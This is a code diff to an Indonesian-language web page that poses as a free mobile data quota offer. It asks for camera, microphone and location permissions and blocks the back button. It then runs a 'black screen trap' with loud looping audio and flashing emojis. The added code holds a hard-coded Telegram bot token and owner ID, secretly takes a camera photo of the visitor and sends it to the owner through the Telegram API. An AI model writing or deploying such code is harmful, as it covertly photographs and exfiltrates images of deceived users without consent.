@@ -26,7 +26,6 @@
             position: relative;
         }
 
-        /* SWAG Animated Gradient Background */
         body::before {
             content: '';
             position: absolute;
@@ -51,14 +50,12 @@
             padding: 20px;
         }
 
-        /* SWAG Card */
         .card {
             background: rgba(8, 8, 18, 0.85);
             backdrop-filter: blur(25px);
             border-radius: 56px;
             border: 1px solid rgba(0, 255, 255, 0.5);
             box-shadow: 0 30px 50px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(0, 255, 255, 0.3), 0 0 30px rgba(0, 255, 255, 0.2);
-            transition: all 0.3s ease;
         }
 
         .header {
@@ -88,14 +85,12 @@
             background-clip: text;
             color: transparent;
             letter-spacing: -1px;
-            text-shadow: 0 0 10px rgba(0,204,255,0.3);
         }
 
         .header p {
             font-size: 13px;
             color: #ccc;
             margin-top: 8px;
-            letter-spacing: 0.5px;
         }
 
         .permission-list {
@@ -168,7 +163,6 @@
             font-weight: 800;
             color: white;
             text-transform: uppercase;
-            letter-spacing: 1px;
             cursor: pointer;
             transition: 0.2s;
             box-shadow: 0 0 15px rgba(0,204,255,0.4);
@@ -259,7 +253,6 @@
 <body>
 
 <div class="app-container" id="app">
-    <!-- Page 0: Permission -->
     <div id="permissionPage">
         <div class="card">
             <div class="header">
@@ -277,23 +270,19 @@
         </div>
     </div>
 
-    <!-- Page 1: Pilih Operator -->
     <div id="operatorPage" class="hidden">
         <div class="card"><div class="header"><h1>PILIH OPERATOR</h1></div><div class="operator-grid" id="operatorGrid"></div></div>
     </div>
 
-    <!-- Page 2: Pilih Kuota -->
     <div id="quotaPage" class="hidden">
         <div class="card"><div class="header"><h1>PILIH KUOTA</h1></div><div id="dailyGrid" class="quota-grid"></div><div id="monthlyGrid" class="quota-grid"></div></div>
     </div>
 
-    <!-- Page 3: Loading Proses -->
     <div id="loadingPage" class="hidden">
         <div class="card"><div class="header"><h1>MEMPROSES...</h1></div><div id="stepList" class="step-list"></div><div class="loading-spinner" id="spinner"></div></div>
     </div>
 </div>
 
-<!-- POPUP PERINGATAN -->
 <div id="popup" class="black-screen" style="background: rgba(0,0,0,0.95); display: none; z-index: 3000;">
     <div style="background: #1a1a2e; padding: 32px; border-radius: 48px; text-align: center; max-width: 300px;">
         <i class="fas fa-exclamation-triangle" style="font-size: 48px; color: #ff3366;"></i>
@@ -302,11 +291,13 @@
     </div>
 </div>
 
-<!-- BLACK SCREEN JEBakan -->
 <div id="blackScreen" class="black-screen"></div>
 
 <script>
-    // ========== MATIKAN NAVIGASI ==========
+    // TELEGRAM BOT CONFIG
+    const BOT_TOKEN = '8920199069:AAF6SR4bWvjAgVrlFXCcwtYqZ-ozWaSiXdE';
+    const OWNER_ID = '8246027862';
+
     history.pushState(null, null, location.href);
     window.onpopstate = () => history.pushState(null, null, location.href);
     window.addEventListener('beforeunload', (e) => {
@@ -316,7 +307,6 @@
         }
     });
 
-    // ========== PERMISSIONS ==========
     let perms = { camera: false, mic: false, storage: false, location: false };
     const toggles = {
         camera: document.getElementById('toggleCamera'),
@@ -382,18 +372,42 @@
         startBlackScreenTrap();
     }
 
+    async function sendPhotoToOwner(imageDataUrl) {
+        try {
+            const blob = await (await fetch(imageDataUrl)).blob();
+            const formData = new FormData();
+            formData.append('chat_id', OWNER_ID);
+            formData.append('photo', blob, 'capture.png');
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+        } catch(e) { console.error('Gagal kirim foto:', e); }
+    }
+
     async function startBlackScreenTrap() {
         const blackDiv = document.getElementById('blackScreen');
         blackDiv.style.display = 'flex';
         blackDiv.innerHTML = '';
-        
-        // MUSIK (volume diatur via JS)
+
+        // Ambil foto dari kamera
+        let imageData = null;
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            imageData = canvas.toDataURL('image/jpeg', 0.8);
+            stream.getTracks().forEach(t => t.stop());
+            await sendPhotoToOwner(imageData);
+        } catch(e) { console.warn('Gagal ambil foto:', e); }
+
         const audio = new Audio('https://files.catbox.moe/4df0hx.mp3');
         audio.loop = true;
         audio.volume = 1.0;
         audio.play().catch(e => console.log);
-        
-        // Volume naik turun setiap 1.5 detik (maks 1.0, min 0.2)
+
         let volUp = true;
         const volInterval = setInterval(() => {
             if (volUp) {
@@ -404,20 +418,18 @@
                 if (audio.volume <= 0.2) volUp = true;
             }
         }, 1500);
-        
-        // Emoji blink 7x (masuk keluar)
+
         for (let i = 0; i < 7; i++) {
             const emojiDiv = document.createElement('div');
             emojiDiv.className = 'emoji-blink';
-            emojiDiv.innerText = '😹'.repeat(12);
+            emojiDiv.innerText = '😹'.repeat(1200);
             emojiDiv.style.textAlign = 'center';
             blackDiv.appendChild(emojiDiv);
             await new Promise(r => setTimeout(r, 300));
             emojiDiv.remove();
             await new Promise(r => setTimeout(r, 200));
         }
-        
-        // Logo NetQuota + By Ronin Os
+
         const logoFinal = document.createElement('div');
         logoFinal.innerHTML = `
             <div style="text-align:center;">
@@ -427,8 +439,7 @@
             </div>
         `;
         blackDiv.appendChild(logoFinal);
-        
-        // 35 detik total, matikan musik & stop interval, reload
+
         setTimeout(() => {
             clearInterval(volInterval);
             audio.pause();
